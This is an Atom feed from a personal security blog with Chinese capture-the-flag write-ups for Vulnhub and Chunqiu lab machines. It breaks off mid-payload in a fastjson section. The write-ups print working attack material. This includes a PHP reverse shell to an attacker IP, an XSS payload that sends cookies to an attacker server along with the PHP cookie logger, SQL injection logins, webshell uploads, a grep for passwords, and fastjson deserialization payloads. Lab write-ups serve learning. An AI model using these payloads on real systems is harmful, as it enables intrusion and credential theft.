<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title></title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-01-11T11:55:05.690Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>xxshh</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vulnhub-LAMPSecurity:CTF7</title>
    <link href="http://example.com/2025/01/11/Vulnhub-LAMPSecurity-CTF7/"/>
    <id>http://example.com/2025/01/11/Vulnhub-LAMPSecurity-CTF7/</id>
    <published>2025-01-11T08:57:15.000Z</published>
    <updated>2025-01-11T11:55:05.690Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>这个靶场也比较简单，就不画思维导图了。</p><h1 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h1><p><img src="/../images/Pasted%20image%2020250111165835.png"></p><p><img src="/../images/Pasted%20image%2020250111171505.png"></p><p>还是先从80端口开始探索。</p><h1 id="0x02-Web渗透及提权"><a href="#0x02-Web渗透及提权" class="headerlink" title="0x02 Web渗透及提权"></a>0x02 Web渗透及提权</h1><p>看起来像是个培训机构的主页 ：</p><p><img src="/../images/Pasted%20image%2020250111171545.png"></p><p>但是翻了一遍没发现什么可利用的点。还有其他几个端口开了 http 服务，访问 901 端口试试：</p><p><img src="/../images/Pasted%20image%2020250111171901.png"></p><p>试了 sql 注入和弱密码都无果，访问 8080 端口看看：</p><p><img src="/../images/Pasted%20image%2020250111171954.png"></p><p>输入个引号，发现存在 sql 注入漏洞:</p><p><img src="/../images/Pasted%20image%2020250111172019.png"></p><p>直接万能密码登录：</p><p><img src="/../images/Pasted%20image%2020250111172127.png"></p><p>找到了用户管理界面：<br><img src="/../images/Pasted%20image%2020250111172521.png"></p><p>此时发现 8080 端口就是 80 端口的后台。</p><p>发现一个文件上传点：</p><p><img src="/../images/Pasted%20image%2020250111192906.png"></p><p>接下来要找到这个文件的位置。gobuster 扫一下目录：</p><p><img src="/../images/Pasted%20image%2020250111193028.png"></p><p>在 assets 目录下找到了刚才上传的后门：</p><p><img src="/../images/Pasted%20image%2020250111180507.png"></p><p>哥斯拉连接后门。查看 &#x2F;etc&#x2F;passwd：</p><p><img src="/../images/Pasted%20image%2020250111180825.png"></p><p>发现很多有 bash 环境的用户，用上一篇学到的 grep 命令查找 ‘pass’ 字符未果。</p><p>挨个文件看看。发现有个 db.php:</p><p><img src="/../images/Pasted%20image%2020250111182502.png"></p><p>数据库连接居然不需要密码！</p><p>连上数据库之后，找到了一系列用户名及密码：</p><p><img src="/../images/Pasted%20image%2020250111193726.png"></p><p>这和之前在 &#x2F;etc&#x2F;passwd 看到的用户对上了，这些密码很有可能该主机的用户密码。</p><p>只有 brain 有备注，说明这个用户很重要，权限可能比其他人都高。但是这时我意识到，因为 10000 端口也是个登录界面，所以在后台我把他的密码改了！改了也没登录成功，属于是得不偿失了。</p><p><img src="/../images/Pasted%20image%2020250111183601.png"></p><p>这下彻底登录不了 brain 用户了，没办法看了 wp 之后，得知此处密码是 my2cent。</p><p>输入 <code>su brain</code>，不知道为什么显示没有该用户：</p><p><img src="/../images/Pasted%20image%2020250111194527.png"></p><p>于是用 ssh 登录，报错：</p><p><img src="/../images/Pasted%20image%2020250111194617.png"></p><p>这是由于靶机太老了，ssh的版本有问题。不过我们可以指定修改一些参数实现登录：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -oHostKeyAlgorithms=ssh-rsa,ssh-dss brian@<span class="hljs-number">192.168.86.137</span><br></code></pre></td></tr></table></figure><p> 运行 <code>sudo -l</code> 之后发现已经权限是 all，直接一键提权：<br> <br><img src="/../images/Pasted%20image%2020250111185825.png"></p><h1 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03 Conclusion"></a>0x03 Conclusion</h1><p>这个靶机给我的教训就是，一定要三思而后行。在做某些操作时，先想想可不可逆，执行之后可能会有什么后果。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x00 Introduction&quot;&gt;&lt;/a&gt;0x00 Introduction&lt;/h1&gt;&lt;p&gt;这个靶场也比较简单，</summary>
      
    
    
    
    
    <category term="Vulnhub" scheme="http://example.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub-LAMPSecurity:CTF5</title>
    <link href="http://example.com/2025/01/11/Vulnhub-LAMPSecurity-CTF5/"/>
    <id>http://example.com/2025/01/11/Vulnhub-LAMPSecurity-CTF5/</id>
    <published>2025-01-11T04:07:33.000Z</published>
    <updated>2025-01-11T07:06:30.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>打得最快的一个靶机。</p><p><img src="/../images/Pasted%20image%2020250111150625.png"></p><h1 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h1><p>首先对所有端口进行 TCP 扫描：</p><p><img src="/../images/Pasted%20image%2020250111123218.png"></p><p>然后详细扫描以上端口:</p><p><img src="/../images/Pasted%20image%2020250111124109.png"></p><p>这个靶机开放的端口很多，首先还是从最熟悉的80端口开始探索。</p><h1 id="0x02-CMS-渗透"><a href="#0x02-CMS-渗透" class="headerlink" title="0x02 CMS 渗透"></a>0x02 CMS 渗透</h1><p><img src="/../images/Pasted%20image%2020250111143356.png"></p><p>按照导航栏逐个探索之后，发现 Blog 处暴露了 CMS 是 NanoCMS：</p><p><img src="/../images/Pasted%20image%2020250111124513.png"></p><p>于是搜索该CMS有没有什么公开的漏洞，看到了一个远程命令执行的漏洞，但是需要经过认证。</p><p>发现该 CMS 是开源的，于是进行代码审计。通过代码中与登录相关的语句找到了以下文件，发现存在密码泄露：</p><p><img src="/../images/Pasted%20image%2020250111133614.png"></p><p>猜测是 MD5 加密：<br><img src="/../images/Pasted%20image%2020250111133738.png"></p><p>但是解密之后的密码不正确。后来才反应过来，真是傻了，程序员改默认密码了呗！</p><p>既然已经知道路径了，于是访问 <a href="http://192.168.86.136/~andy/data/pagesdata.txt">http://192.168.86.136/~andy/data/pagesdata.txt</a> ：</p><p><img src="/../images/Pasted%20image%2020250111140311.png"></p><p><img src="/../images/Pasted%20image%2020250111140338.png"></p><p>用该密码成功登录后台。接下来按照常规思路找文件上传或代码执行点。在 New Page 新建了一个页面之后，发现它创建了一个 php 文件：</p><p><img src="/../images/Pasted%20image%2020250111140622.png"></p><p>把 kali 自带的反弹 shell php 内容复制过去：</p><p><img src="/../images/Pasted%20image%2020250111140908.png"></p><p>本机开启 888 端口监听，然后访问该文件：</p><p><img src="/../images/Pasted%20image%2020250111141056.png"></p><p>成功执行反弹 shell :</p><p><img src="/../images/Pasted%20image%2020250111141155.png"></p><h1 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h1><p>查看 <code>/etc/passwd</code>:</p><p><img src="/../images/Pasted%20image%2020250111141709.png"></p><p>存在好几个有 bash 环境的用户，而我们拿到的用户权限很低。</p><p>之前接触过的 suid，crontab 都试过之后没找到可以利用的信息，用 msf 又感觉没必要，接下来就无从下手了。</p><p>看了 wp 之后学到个思路。既然有这么多有 bash 环境的用户，那么会不会存在管理员，其文件夹下存放了其他用户或者 root 用户的密码?</p><p>在 &#x2F;home 目录搜索一下包含 ‘pass’ 字符串的文件有哪些，命令如下：</p><figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -R -i pass <span class="hljs-regexp">/home/</span>* <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br># <span class="hljs-keyword">grep</span>: 是一个用于在文件中搜索指定模式的命令。<br># -R: 表示递归搜索，将在指定目录及其子目录下搜索文件。<br># -i: 表示忽略大小写，在搜索时不区分大小写。<br># pass: 是要搜索的字符串模式。<br># <span class="hljs-regexp">/home/</span>*: 搜索的目录路径，<span class="hljs-regexp">/home/</span>表示在<span class="hljs-regexp">/home/</span>目录下搜索，*表示搜索所有子目录和文件。<br># <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>: 将标准错误输出重定向到<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>设备<br></code></pre></td></tr></table></figure><p>最终发现一个文件内包含 ‘Root password’字符：<br><img src="/../images/Pasted%20image%2020250111142824.png"></p><p>查看这个文件：</p><p><img src="/../images/Pasted%20image%2020250111142939.png"></p><p>切换 root 用户，试试这个密码。</p><p>提权成功：<br><img src="/../images/Pasted%20image%2020250111143108.png"></p><h1 id="0x04-Conclusion"><a href="#0x04-Conclusion" class="headerlink" title="0x04 Conclusion"></a>0x04 Conclusion</h1><p>这个靶场挺简单的，可能是因为太老了，09年的靶机了。给我的启发就是以后要善于用 <code>find</code> 和<code>grep</code>等搜索命令。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x00 Introduction&quot;&gt;&lt;/a&gt;0x00 Introduction&lt;/h1&gt;&lt;p&gt;打得最快的一个靶机。</summary>
      
    
    
    
    
    <category term="Vulnhub" scheme="http://example.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>CTF5</title>
    <link href="http://example.com/2025/01/11/CTF5/"/>
    <id>http://example.com/2025/01/11/CTF5/</id>
    <published>2025-01-11T04:06:42.000Z</published>
    <updated>2025-01-11T04:06:43.001Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnhub-Prime1</title>
    <link href="http://example.com/2025/01/09/Vulnhub-Prime1/"/>
    <id>http://example.com/2025/01/09/Vulnhub-Prime1/</id>
    <published>2025-01-09T04:13:32.000Z</published>
    <updated>2025-01-09T14:12:07.947Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>这个靶机更像是在教学，每一句话都有可能是提示，不注意的话就无从下手了。借用这个靶机还复习了下 XSS 漏洞。</p><p><img src="/../images/Pasted%20image%2020250109214144.png"></p><h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>首先对所有端口进行 TCP 扫描：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sT --min-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">192.168.86.135</span><br></code></pre></td></tr></table></figure><p>扫两次结果如下：</p><p><img src="/../images/Pasted%20image%2020250109122414.png"></p><p>然后对以上两个端口详细扫描：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sT -sC -sV -O -p22,<span class="hljs-number">80</span> <span class="hljs-number">192.168.86.135</span> <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250109122620.png"></p><p>接下来进行漏洞脚本扫描：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -script=vuln -p22,<span class="hljs-number">80</span> <span class="hljs-number">192.168.86.135</span> <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250109123541.png"></p><p>DOS 攻击不做考虑，但是枚举出了两个网站目录，并且得知该网站的 CMS 是 wordpress。</p><h1 id="0x02-Web-渗透"><a href="#0x02-Web-渗透" class="headerlink" title="0x02 Web 渗透"></a>0x02 Web 渗透</h1><p>浏览器访问 <a href="http://192.168.86.135/">http://192.168.86.135</a> :</p><p><img src="/../images/Pasted%20image%2020250109123013.png"></p><p>查看网页源代码没什么信息，接下来目录爆破：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gobuster</span> dir -u http://<span class="hljs-number">192.168.86.135</span> -w /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250109124110.png"></p><p>逐个访问：</p><p><img src="/../images/Pasted%20image%2020250109123954.png"></p><p><img src="/../images/Pasted%20image%2020250109124229.png"></p><p><img src="/../images/Pasted%20image%2020250109124719.png"></p><p>搜索 WordPress 5.2.2 相关漏洞，发现有一个 XSS 漏洞，但是是在用户登录之后的发表预览界面：</p><p><img src="/../images/Pasted%20image%2020250109134946.png"></p><p>而且 XSS 漏洞的主要作用是注入并执行恶意 JavaScript 代码，目标是用户的浏览器，而不是服务器。此处复习一下 XSS：<a href="https://blog.csdn.net/qq_41959899/article/details/105925528#4.%E5%8F%8D%E5%B0%84%E5%9E%8B%EF%BC%88%E5%9B%9B%E7%A7%8D%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%AB%E6%BC%94%E7%A4%BA%EF%BC%89">XSS详解（概念+靶场演示）反射型与存储型的比较与详细操作_反射型xss-CSDN博客</a></p><p>WordPress 是开源的，查看源代码也没找到入手点。于是搜索 wp，发现<code>/dev</code>的那段话是个提示：你好，现在你在第0级别，在真实的渗透测试中我们会<strong>非常努力地使用工具去深挖web</strong>，祝你渗透愉快。</p><p>刚才使用 gobuster 只扫描出了目录，没有扫描到文件，那么限定后缀名试试：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gobuster</span> dir -u http://<span class="hljs-number">192.168.86.135</span> -w /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt -x php,zip,txt<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250109143308.png"></p><p>访问 &#x2F;secret.txt:</p><p><img src="/../images/Pasted%20image%2020250109143607.png"></p><p>提示我们对每一个 php 文件进行模糊测试，并提供了一个工具。完成这一步之后查看 location.txt。</p><p>上述扫描结果中出现了 index.php 和 image.php，那么用提供的工具逐个 fuzz。<strong>wfuzz</strong> 在 kali 里有，不需要下载；</p><p><img src="/../images/Pasted%20image%2020250109144030.png"></p><p><img src="/../images/Pasted%20image%2020250109145641.png"></p><p>根据以上提示构造如下命令:</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">wfuzz -c -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wfuzz/</span>wordlist<span class="hljs-regexp">/general/</span>common.txt  http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">86.135</span>/index.php?FUZZ=<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250109150119.png"></p><p>大部分都是 136Ch，只发现了一个与众不同的 payload：file。于是根据 &#x2F;secret.txt 中的提示，接下来访问 <a href="http://192.168.86.135/index.php?file=location.txt">http://192.168.86.135/index.php?file=location.txt</a> ：</p><p><img src="/../images/Pasted%20image%2020250109150455.png"></p><p>又是一个提示，那么就访问 <a href="http://192.168.86.135/image.php?secrettier360">http://192.168.86.135/image.php?secrettier360</a> 看看：</p><p><img src="/../images/Pasted%20image%2020250109150729.png"><br>告诉我们这是正确参数。到这一步，应该想到能否利用文件包含漏洞。</p><h1 id="0x03-文件包含漏洞利用"><a href="#0x03-文件包含漏洞利用" class="headerlink" title="0x03 文件包含漏洞利用"></a>0x03 文件包含漏洞利用</h1><p>尝试读取 <code>/etc/passwd</code> :</p><p><img src="/../images/Pasted%20image%2020250109152833.png"></p><p>展示效果不好，还是用 <code>curl</code> 命令看:</p><p><img src="/../images/Pasted%20image%2020250109153218.png"></p><p>主要看有 bash 环境的：root 和 victor 。此外，saket 用户处有一句话：在 <code>/home/saket</code>有 password.txt，那么就访问这个路径：</p><p><img src="/../images/Pasted%20image%2020250109153755.png"></p><p>这会不会就是 victor 用户的密码？登录 CMS 试试：</p><p><img src="/../images/Pasted%20image%2020250109153935.png"></p><p>登录成功。还在后台看到了我之前在评论区提交的 JS 代码。这次在 Posts 页面试试存储型 XSS 攻击。</p><h1 id="0x04-XSS-漏洞利用"><a href="#0x04-XSS-漏洞利用" class="headerlink" title="0x04 XSS 漏洞利用"></a>0x04 XSS 漏洞利用</h1><p>在输入框输入以下内容：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(/XSS/)&quot;</span>&gt;</span>poc<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>点击预览，成功触发 XSS 漏洞：</p><p><img src="/../images/Pasted%20image%2020250109161642.png"></p><p>创建个 cookie.php，内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];<br>   <span class="hljs-variable">$log</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;cookie.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br>   <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$log</span>,<span class="hljs-variable">$cookie</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>   <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$log</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在 8000 端口开启个 http 服务：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p>在输入框输入以下内容：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:var img=new Image();img.src=&#x27;http://192.168.86.128:8000/cookie.php?cookie=&#x27;+encodeURIComponent(document.cookie);&quot;</span>&gt;</span>poc<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>点击 poc 后成功触发漏洞：</p><p><img src="/../images/Pasted%20image%2020250109164801.png"></p><p>看看浏览器中的 cookie 是不是这个：</p><p><img src="/../images/Pasted%20image%2020250109164952.png"></p><p>没错，成功窃取了两个 cookie。由此也知道，要想防御 XSS 攻击窃取 cookie，可以设置 HttpOnly 属性。</p><h1 id="0x05-CMS-渗透"><a href="#0x05-CMS-渗透" class="headerlink" title="0x05 CMS 渗透"></a>0x05 CMS 渗透</h1><p>言归正传。登录进后台之后，按照常规思路找找有没有文件上传或代码执行的地方。</p><p>发现一个可写的 php 文件;</p><p><img src="/../images/Pasted%20image%2020250109170618.png"></p><p>接下来就是常规的执行反弹 shell 的过程了。</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.86.128/888 0&gt;&amp;1&#x27;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>接下来去触发这个 php 文件。由于 wordpress 是个非常出名的 CMS，直接搜索它的主题代码路径：</p><p><img src="/../images/Pasted%20image%2020250109172716.png"></p><p>该主题是Twenty Nineteen，于是访问的路径应该是：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">86.135</span><span class="hljs-regexp">/wordpress/</span>wp-content<span class="hljs-regexp">/themes/</span>twentynineteen/secret.php<br></code></pre></td></tr></table></figure><p>反弹 shell 成功执行：</p><p><img src="/../images/Pasted%20image%2020250109173232.png"></p><p>使用 python 创建一个完全交互式的 shell:</p><figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">python -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><h1 id="0x06-内核漏洞提权"><a href="#0x06-内核漏洞提权" class="headerlink" title="0x06 内核漏洞提权"></a>0x06 内核漏洞提权</h1><p>输入 <code>id</code>, <code>uname -a</code>, <code>sudo-l</code> 查看一些基本信息:</p><p><img src="/../images/Pasted%20image%2020250109174226.png"></p><p>发现一个拥有 sudo 权限的文件，执行一下试试：</p><p><img src="/../images/Pasted%20image%2020250109175644.png"></p><p>发现需要密码，于是放弃。</p><p><code>cat /etc/contab</code> 也没什么可以利用的文件：</p><p><img src="/../images/Pasted%20image%2020250109175904.png"></p><p>既然如此那就上 msf 吧，看看能不能利用内核漏洞提权：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">msfconsole</span><br><span class="hljs-attribute">search</span> Linux ubuntu <span class="hljs-number">4</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>-<span class="hljs-number">28</span>-generic<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250109180441.png"></p><figure class="highlight gauss"><table><tr><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">use</span> exploit/linux/<span class="hljs-keyword">local</span>/bpf_sign_extension_priv_esc<br><span class="hljs-keyword">show</span> options  <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250109182154.png"></p><p>首先要通过 ssh 登录，但是使用 CMS 的用户名及密码登录失败了。</p><p>再用 linPEAs 试试。本机开一个 http 服务，让靶机下载 linPEAs.sh（靶机没有 curl）：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">wget</span> http://192.168.86.128:8000/linpeas.sh <br></code></pre></td></tr></table></figure><p>添加执行权限并执行:</p><p>选择一个可能的漏洞:</p><p><img src="/../images/Pasted%20image%2020250109204804.png"></p><p>避免文件权限问题，在 &#x2F;tmp 下载其 poc ，编译并执行，提权成功：</p><p><img src="/../images/Pasted%20image%2020250109212047.png"></p><h1 id="0x07-Conclusion"><a href="#0x07-Conclusion" class="headerlink" title="0x07 Conclusion"></a>0x07 Conclusion</h1><p>这个靶机虽然不难，但还是看了 wp 之后才打下来的。内核漏洞提权太看运气，我试了好几个才成功，正确姿势应该是利用我没能找到密码的 &#x2F;home&#x2F;saket&#x2F;enc ，wp 见下方链接：<br><a href="https://blog.csdn.net/Bossfrank/article/details/131235993">红队打靶：Prime1详细打靶提权思路之OpenSSL解密（vulnhub）_openssl提权-CSDN博客</a>  </p><p>但是这种打法太复杂，我现在还理解不了，日后再回来看。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Introduction&quot;&gt;&lt;a href=&quot;#0x00-Introduction&quot; class=&quot;headerlink&quot; title=&quot;0x00 Introduction&quot;&gt;&lt;/a&gt;0x00 Introduction&lt;/h1&gt;&lt;p&gt;这个靶机更像是在教学</summary>
      
    
    
    
    
    <category term="Vulnhub" scheme="http://example.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Exchange</title>
    <link href="http://example.com/2025/01/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/"/>
    <id>http://example.com/2025/01/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/</id>
    <published>2025-01-02T07:29:55.000Z</published>
    <updated>2025-01-08T05:53:55.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>Exchange 靶场涉及到内网渗透中的信息收集、代理转发、内网扫描、特权提升以及横向移动等技术方法，能够加强对域环境核心认证机制的理解。</p><p><img src="/../images/Pasted%20image%2020250104190242.png"></p><p><img src="/../images/Pasted%20image%2020250104224650.png"></p><h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sT --min-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">39.99.135.190</span> <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250102153108.png"></p><p>发现有四个开放的端口：21，22，80，8000。注意 nmap 扫描最好扫两次，比对结果是否相同。我第一次扫描时就没扫出来 8000 端口。</p><p>接下来对这四个端口进行详细信息扫描：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sT -sC -sV -O -p21,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">8000</span> <span class="hljs-number">39.99.135.190</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020250102153841.png"></p><p>浏览器访问 <a href="http://39.99.135.190/">http://39.99.135.190</a> ，显示禁止访问：</p><p><img src="/../images/Pasted%20image%2020250102154134.png"></p><p>扫描 8000 端口的时候，得到了一个 url : <a href="http://39.99.135.190:8000/login.html">http://39.99.135.190:8000/login.html</a> 。访问之后，是个登录页面：</p><p><img src="/../images/Pasted%20image%2020250102154335.png"></p><p>接下来开始 Web 渗透。</p><h1 id="0x02-Web渗透"><a href="#0x02-Web渗透" class="headerlink" title="0x02 Web渗透"></a>0x02 Web渗透</h1><p>搜索关键词：Lumia ERP v2.3 CVE ，发现该系统存在未授权访问漏洞和远程命令执行漏洞：</p><p><a href="https://cn-sec.com/archives/1798444.html">华夏erp账号密码泄露+后台rce（最新组合漏洞) | CN-SEC 中文网</a></p><p><img src="/../images/Pasted%20image%2020250102160433.png"></p><p>访问 <code>/user/getAllList;.ico</code> 可以获取用户凭据：</p><p><img src="/../images/Pasted%20image%2020250102161200.png"></p><p>密码应该是被 MD5 加密了：<br><img src="/../images/Pasted%20image%2020250102161340.png"></p><p>原来密码就是 123456，那么一开始尝试弱口令也能登录。</p><p>登录管理员账号后进入后台：</p><p><img src="/../images/Pasted%20image%2020250102161515.png"></p><p>上述资料说后台存在 fastjson 反序列化漏洞，到现在还没接触过，搜一搜：</p><p><a href="https://xz.aliyun.com/t/14872?time__1311=GqA2Y50K4IxBqDwqeqBKKAIxQ=60xDOAeD#toc-0">Java中Fastjson各版本漏洞对抗史与总结 - 先知社区</a><br><a href="https://blog.csdn.net/Bossfrank/article/details/130100893">Fastjson反序列化漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）_fastjson漏洞原理-CSDN博客</a></p><h1 id="0x03-Fastjson反序列化漏洞利用"><a href="#0x03-Fastjson反序列化漏洞利用" class="headerlink" title="0x03 Fastjson反序列化漏洞利用"></a>0x03 Fastjson反序列化漏洞利用</h1><p>fastjson 是一个由阿里开发的开源 JSON 解析库，可以将 Java 对象转换为 JSON 格式(序列化)，也可以将 JSON 字符串转换为 Java 对象（反序列化）。</p><p><strong>漏洞原理：</strong><br>Fastjson反序列化漏洞是源于在处理 json 数据时对输入的验证不足，没有对<code>@type</code>字段进行过滤，导致攻击者可以构造一个恶意的 JSON 数据，将恶意类作为 AutoType 的值。当 fastjson 反序列化时，从而实例化指定类导致远程代码执行。</p><p>该漏洞在后台用户管理的查询功能处触发：</p><p><img src="/../images/Pasted%20image%2020250102180558.png"></p><p>首先抓个包验证是否存在 fastjson 反序列化漏洞。</p><p>payload：</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;b0ab221691.ipv6.1433.eu.org.&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>将 search 值改为 url 编码后的 payload：</p><p><img src="/../images/Pasted%20image%2020250102181757.png"></p><p>接收到 DNS 记录，证明 fastjson 反序列化漏洞利用成功。<br><img src="/../images/Pasted%20image%2020250102181730.png"></p><p>接下来构造 mysql-JDBC 利用链执行反弹 shell：<a href="https://blog.csdn.net/qq_42077227/article/details/130236560">fastjson 反序列化之mysql JDBC 利用_fastjson mysql-CSDN博客</a></p><p>需要用到 evil-mysql-server 和 ysoserial-all.jar 。</p><p><a href="https://github.com/dushixiang/evil-mysql-server">evil-mysql-server</a>是一个针对 jdbc 反序列化漏洞编写的恶意数据库，依赖 ysoserial。<a href="https://github.com/frohoff/ysoserial/releases">ysoserial-all.jar</a>是一个 java 反序列化利用神器。</p><p>放在同一个文件夹下，编译 go 文件：</p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> build evil-mysql-server.<span class="hljs-keyword">go</span><br></code></pre></td></tr></table></figure><p>执行以下命令开启一个 fake mysql server：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">./evil-mysql-<span class="hljs-keyword">server</span> -addr <span class="hljs-number">3307</span> -java java -ysoserial ysoserial-<span class="hljs-keyword">all</span>.jar<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-string">&quot;name&quot;</span>: &#123;<br><span 